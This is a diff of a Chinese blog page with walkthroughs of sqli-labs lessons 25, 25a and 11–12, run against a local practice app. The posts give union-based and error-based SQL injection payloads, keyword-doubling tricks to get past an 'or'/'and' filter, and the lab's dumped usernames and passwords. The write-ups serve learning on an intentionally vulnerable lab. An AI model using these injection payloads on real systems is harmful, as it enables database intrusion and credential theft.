@@ -64,6 +64,43 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-25a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/16/sql-labs-Less-25a/" class="article-date">
+  <time datetime="2021-02-16T06:03:16.000Z" itemprop="datePublished">2021-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/16/sql-labs-Less-25a/">sql-labs-Less-25a</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1,%E6%AD%A3%E5%B8%B8%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E8%83%BD%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-25a/，输入?id=1,正常，在输入&#39;，出现错误，但没有报错，说明不能用报错注入。</a><br>查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。<br>可以用联合注入和延时注入。<br>这里用联合注入：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=1">http://127.0.0.1/sql/Less-25a/?id=1</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,2,3–+<br>查库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,database(),3–+<br>查表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>查列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>查字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/16/sql-labs-Less-25a/" data-id="ckl7qekm800006cux4z216qc2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-25" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/15/sql-labs-Less-25/" class="article-date">
@@ -89,7 +126,7 @@
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1%EF%BC%8C%E6%AD%A3%E5%B8%B8%E8%BE%93%E5%87%BA%E3%80%82">http://127.0.0.1/sql/Less-25/，输入?id=1，正常输出。</a><br>再输入’，发生报错，从报错信息来看这关的注入字符是’，再输入–+进行注释，正常输出，说明可以用’注入。<br>输入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> order by 3–+，发现报错：</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="2"><br>发现报错语句中只有‘der by’，与我们输入的‘order by’不一样。<br>查看源代码：</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/15/sql-labs-Less-25/1.png" alt="1"><br>发现对大小写的’or’和’and’进行了过滤，既输入的注入语句中的or和and会变为空。</p>
-<p>方法一：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,database(),3–+（<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3–+）<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
+<p>方法一（联合注入）：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;">http://127.0.0.1/sql/Less-25/?id=1&#39;</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,2,3–+<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,database(),3–+（<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3–+）<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=-1&#39;">http://127.0.0.1/sql/Less-25/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
 <p>方法二（报错注入）：<br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,database()))–+<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’)))–+<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’)))–+<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select id from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select username from users limit 0,1)))–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25/?id=1&#39;||">http://127.0.0.1/sql/Less-25/?id=1&#39;||</a> extractvalue(1,concat(0x7e,(select password from users limit 0,1)))–+<br>（这里不用group_concat函数是因为在报错语句在它的输出有字数限制(?)）</p>
 <h2>小结</h2>
 WAF绕过<br>
@@ -545,67 +582,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
 
 
   
-    <article id="post-sql-labs-Less-11~12" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/06/sql-labs-Less-11~12/" class="article-date">
-  <time datetime="2021-02-06T09:18:42.000Z" itemprop="datePublished">2021-02-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11~12</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-11</h1>
-
-<p>进入 <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-11">http://127.0.0.1/sql/Less-11</a> ，显示如下：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/1.png" alt="1"></p>
-<p>都输入admin进行登入：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/2.png" alt="2"></p>
-<p>然后进行sql注入判断，在username输入admin’，在password输入admin，显示如下：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/3.png" alt="3"></p>
-<p>说明有sql注入漏洞，再在username输入admin’#,password不变，正常登入，说明可以用<code>‘</code>注入。<br>也可以在username输入admin\，password不输，显示如下：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/4.png" alt="4"></p>
-<p>看到\后面是<code>&#39;</code>，说明可以用<code>&#39;</code>注入。</p>
-<p>在username输入admin’ order by 2#，正常输出，说明数据有两列。<br>再在username输入1admin’ union select 1,2#(前面的1和less-1的id=-1是一样的道理)：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/5.png" alt="5"></p>
-<p>可以看到1在username输出，2在password输出。<br>在username输入1admin’ union select 1,database()#：(也可以用1admin’ union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin’ union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/6.png" alt="6"></p>
-<p>可以看到在password输出了库名：security<br>再在username输入1admin’ union select 1,table_name from information_schema.tables where table_schema=’security’ limit 0,1#(也可以用1admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’#)(以下都是用group_concat函数的)</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/7.png" alt="7"></p>
-<p>得到表名：emails,referers,uagents,users<br>再在username输入1admin’ union select 1,column_name from information_schema.columns where table_name=’users’ limit 0,1#(也可以用1admin’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#)</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/8.png" alt="8"></p>
-<p>得到列名：id,username,password<br>再在username输入1admin’ union select username,password from users limit 0,1#(也可以用1admin’ union select group_concat(username),group_concat(password) from users#)</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/9.png" alt="9"></p>
-<p>得到用户名和密码：<br>username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
-<h1>Less-12</h1>
-
-<p>和Less-11一样，只是把’换成了”)。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/06/sql-labs-Less-11~12/" data-id="ckktlz2iv0000l8ux9b376ms4" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -642,6 +618,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
+            <a href="/2021/02/16/sql-labs-Less-25a/">sql-labs-Less-25a</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/15/sql-labs-Less-25/">sql-labs-Less-25</a>
           </li>
         
@@ -655,10 +635,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
         
           <li>
             <a href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/12/sql-labs-Less-20/">sql-labs-Less-20</a>
           </li>
         
       </ul>
